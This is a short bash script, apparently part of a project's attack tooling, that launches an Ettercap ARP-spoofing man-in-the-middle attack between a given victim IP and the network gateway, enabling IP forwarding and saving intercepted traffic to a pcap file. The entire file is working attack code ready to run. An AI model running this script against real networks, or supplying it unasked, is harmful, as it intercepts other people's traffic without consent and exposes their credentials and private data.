#!/bin/bash
# src/attack/run_ettercap.sh
# Launch Ettercap MITM attack

set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <victim IP>"
  exit 1
fi

victim_ip="$1"
gateway_ip="$(bash $(dirname "$0")/get_gateway_ip.sh)"

echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.inet.ip.forwarding=1

echo "[*] Starting Ettercap against $victim_ip <-> $gateway_ip..."
sudo ettercap -T -i en0 -M arp:remote /${victim_ip}// /${gateway_ip}// -w data/ettercap_session.pcap

